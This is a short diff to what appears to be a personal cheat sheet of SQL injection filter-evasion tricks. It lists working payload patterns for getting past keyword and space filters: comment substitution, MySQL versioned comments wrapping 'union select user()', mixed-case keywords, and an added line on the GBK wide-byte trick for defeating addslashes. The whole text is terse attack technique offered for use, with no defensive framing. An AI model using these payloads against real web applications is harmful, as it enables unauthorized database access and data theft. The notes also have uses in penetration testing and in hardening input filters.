@@ -1,2 +1,3 @@
 filter space: comment /**/ or exp union select '/*!union*/select user()%23  ( /*!xxxx*/)
 upcase, lower case : UNION or union ////// MIX: uNiOn
+GBK:Bypass addslashes : %df,%ef ...
